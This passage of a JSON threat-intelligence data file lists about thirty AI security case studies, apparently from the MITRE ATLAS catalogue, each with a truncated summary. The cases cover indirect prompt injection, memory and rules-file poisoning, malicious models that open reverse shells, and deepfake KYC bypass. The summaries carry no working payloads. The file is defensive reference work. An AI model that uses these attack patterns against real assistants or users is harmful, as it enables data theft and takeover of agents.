      "summary": "[Embrace the Red](https://embracethered.com/blog/) demonstrated that ChatGPT users' conversations can be exfiltrated via an indirect prompt injection. To execute the attack, a threat actor uploads a m...",
      "techniques": []
    },
    {
      "id": "AML.CS0022",
      "name": "ChatGPT Package Hallucination",
      "summary": "Researchers identified that large language models such as ChatGPT can hallucinate fake software package names that are not published to a package repository. An attacker could publish a malicious pack...",
      "techniques": []
    },
    {
      "id": "AML.CS0023",
      "name": "ShadowRay",
      "summary": "Ray is an open-source Python framework for scaling production AI workflows. Ray's Job API allows for arbitrary remote execution by design. However, it does not offer authentication, and the default co...",
      "techniques": []
    },
    {
      "id": "AML.CS0024",
      "name": "Morris II Worm: RAG-Based Attack",
      "summary": "Researchers developed Morris II, a zero-click worm designed to attack generative AI (GenAI) ecosystems and propagate between connected GenAI systems. The worm uses an adversarial self-replicating prom...",
      "techniques": []
    },
    {
      "id": "AML.CS0025",
      "name": "Web-Scale Data Poisoning: Split-View Attack",
      "summary": "Many recent large-scale datasets are distributed as a list of URLs pointing to individual datapoints. The researchers show that many of these datasets are vulnerable to a \"split-view\" poisoning attack...",
      "techniques": []
    },
    {
      "id": "AML.CS0026",
      "name": "Financial Transaction Hijacking with M365 Copilot as an Insider",
      "summary": "Researchers from Zenity conducted a red teaming exercise in August 2024 that successfully manipulated Microsoft 365 Copilot.[<sup>\\[1\\]</sup>][1] The attack abused the fact that Copilot ingests receiv...",
      "techniques": []
    },
    {
      "id": "AML.CS0027",
      "name": "Organization Confusion on Hugging Face",
      "summary": "[threlfall_hax](https://5stars217.github.io/), a security researcher, created organization accounts on Hugging Face, a public model repository, that impersonated real organizations. These false Huggin...",
      "techniques": []
    },
    {
      "id": "AML.CS0028",
      "name": "AI Model Tampering via Supply Chain Attack",
      "summary": "Researchers at Trend Micro, Inc. used service indexing portals and web searching tools to identify over 8,000 misconfigured private container registries exposed on the internet. Approximately 70% of t...",
      "techniques": []
    },
    {
      "id": "AML.CS0029",
      "name": "Google Bard Conversation Exfiltration",
      "summary": "[Embrace the Red](https://embracethered.com/blog/) demonstrated that Bard users' conversations could be exfiltrated via an indirect prompt injection. To execute the attack, a threat actor shares a Goo...",
      "techniques": []
    },
    {
      "id": "AML.CS0030",
      "name": "LLM Jacking",
      "summary": "The Sysdig Threat Research Team discovered that malicious actors utilized stolen credentials to gain access to cloud-hosted large language models (LLMs). The actors covertly gathered information about...",
      "techniques": []
    },
    {
      "id": "AML.CS0031",
      "name": "Malicious Models on Hugging Face",
      "summary": "Researchers at ReversingLabs have identified malicious models containing embedded malware hosted on the Hugging Face model repository. The models were found to execute reverse shells when loaded, whic...",
      "techniques": []
    },
    {
      "id": "AML.CS0032",
      "name": "Attempted Evasion of ML Phishing Webpage Detection System",
      "summary": "Adversaries create phishing websites that appear visually similar to legitimate sites. These sites are designed to trick users into entering their credentials, which are then sent to the bad actor. To...",
      "techniques": []
    },
    {
      "id": "AML.CS0033",
      "name": "Live Deepfake Image Injection to Evade Mobile KYC Verification",
      "summary": "Facial biometric authentication services are commonly used by mobile applications for user onboarding, authentication, and identity verification for KYC requirements. The iProov Red Team demonstrated ...",
      "techniques": []
    },
    {
      "id": "AML.CS0034",
      "name": "ProKYC: Deepfake Tool for Account Fraud Attacks",
      "summary": "Cato CTRL security researchers have identified ProKYC, a deepfake tool being sold to cybercriminals as a method to bypass Know Your Customer (KYC) verification on financial service applications such a...",
      "techniques": []
    },
    {
      "id": "AML.CS0035",
      "name": "Data Exfiltration from Slack AI via Indirect Prompt Injection",
      "summary": "[PromptArmor](https://promptarmor.substack.com) demonstrated that private data can be exfiltrated from Slack AI via indirect prompt injections. The attack relied on Slack AI ingesting a malicious prom...",
      "techniques": []
    },
    {
      "id": "AML.CS0036",
      "name": "AIKatz: Attacking LLM Desktop Applications",
      "summary": "Researchers at Lumia have demonstrated that it is possible to extract authentication tokens from the memory of LLM Desktop Applications. An attacker could then use those tokens to impersonate as the v...",
      "techniques": []
    },
    {
      "id": "AML.CS0037",
      "name": "Data Exfiltration via Agent Tools in Copilot Studio",
      "summary": "Researchers from Zenity demonstrated how an organization\u2019s data can be exfiltrated via prompt injections that target an AI-powered customer service agent.\n\nThe target system is a customer service agen...",
      "techniques": []
    },
    {
      "id": "AML.CS0038",
      "name": "Planting Instructions for Delayed Automatic AI Agent Tool Invocation",
      "summary": "[Embrace the Red](https://embracethered.com/blog/) demonstrated that Google Gemini is susceptible to automated tool invocation by delaying the execution to the next conversation turn. This bypasses a ...",
      "techniques": []
    },
    {
      "id": "AML.CS0039",
      "name": "Living Off AI: Prompt Injection via Jira Service Management",
      "summary": "Researchers from Cato Networks demonstrated how adversaries can exploit AI-powered systems embedded in enterprise workflows to execute malicious actions with elevated privileges. This is achieved by c...",
      "techniques": []
    },
    {
      "id": "AML.CS0040",
      "name": "Hacking ChatGPT\u2019s Memories with Prompt Injection",
      "summary": "[Embrace the Red](https://embracethered.com/blog/) demonstrated that ChatGPT\u2019s memory feature is vulnerable to manipulation via prompt injections. To execute the attack, the researcher hid a prompt in...",
      "techniques": []
    },
    {
      "id": "AML.CS0041",
      "name": "Rules File Backdoor: Supply Chain Attack on AI Coding Assistants",
      "summary": "Pillar Security researchers demonstrated how adversaries can compromise AI-generated code by injecting malicious instructions into rules files used to configure AI coding assistants like Cursor and Gi...",
      "techniques": []
    },
    {
      "id": "AML.CS0042",
      "name": "SesameOp: Novel backdoor uses OpenAI Assistants API for command and control",
      "summary": "The Microsoft Incident Response - Detection and Response Team (DART) investigated a compromised system where a threat actor utilized SesameOp, a backdoor implant that abuses the OpenAI Assistants API ...",
      "techniques": []
    },
    {
      "id": "AML.CS0043",
      "name": "Malware Prototype with Embedded Prompt Injection",
      "summary": "Check Point Research identified a prototype malware sample in the wild that contained a prompt injection, which appeared to be designed to manipulate LLM-based malware detectors and/or analysis tools....",
      "techniques": []
    },
    {
      "id": "AML.CS0044",
      "name": "LAMEHUG: Malware Leveraging Dynamic AI-Generated Commands",
      "summary": "In July 2025, Ukrainian authorities reported the emergence of LAMEHUG, a new AI-powered malware attributed to the Russian state-backed threat actor [APT28](https://attack.mitre.org/groups/G0007/) (als...",
      "techniques": []
    },
    {
      "id": "AML.CS0045",
      "name": "Data Exfiltration via an MCP Server used by Cursor",
      "summary": "The Backslash Security Research Team demonstrated that a Model Context Protocol (MCP) tool can be used as a vector for an indirect prompt injection attack on Cursor, potentially leading to the executi...",
      "techniques": []
    },
    {
      "id": "AML.CS0046",
      "name": "Data Destruction via Indirect Prompt Injection Targeting Claude Computer-Use",
      "summary": "Security researchers at HiddenLayer demonstrated that an indirect prompt injection targeting Claude\u2019s Computer Use AI can lead to execution of shell commands on the victim system and destruction of us...",
      "techniques": []
    },
    {
      "id": "AML.CS0047",
      "name": "Code to Deploy Destructive AI Agent Discovered in Amazon Q VS Code Extension",
      "summary": "On July 13th, 2025, a malicious actor using the GitHub username \"lkmanka58\" used an inappropriately scoped GitHub token to make a commit containing malicious code to the Amazon Q Developer Visual Stud...",
      "techniques": []
    },
    {
      "id": "AML.CS0048",
      "name": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
      "summary": "A security researcher identified hundreds of exposed ClawdBot control interfaces on the public internet. ClawdBot (now OpenClaw) \u201cis a personal AI assistant you run on your own devices. It answers you...",
      "techniques": []
    },
    {
      "id": "AML.CS0049",
      "name": "Supply Chain Compromise via Poisoned ClawdBot Skill",
      "summary": "A security researcher demonstrated a proof-of-concept supply chain attack using a poisoned ClawdBot Skill shared on ClawdHub, a Skill registry for agents. The poisoned Skill contained a prompt injecti...",
      "techniques": []
    },
    {
      "id": "AML.CS0050",
      "name": "OpenClaw 1-Click Remote Code Execution",
      "summary": "A security researcher demonstrated a 1-click remote code execution (RCE) vulnerability to the OpenClaw AI Agent via a malicious link containing a JavaScript script that only takes milliseconds to exec...",
      "techniques": []
    },
    {
      "id": "AML.CS0051",
      "name": "OpenClaw Command & Control via Prompt Injection",
      "summary": "Researchers at HiddenLayer demonstrated how a webpage can embed an indirect prompt injection that causes OpenClaw to silently execute a malicious script. Once executed, the script plants persistent ma...",
      "techniques": []
    }
  ],
  "stats": {
    "totalTactics": 16,
    "totalTechniques": 155,
    "totalCaseStudies": 52
  },
  "lastUpdated": "2026-02-21T02:15:38.504324+05:30"
}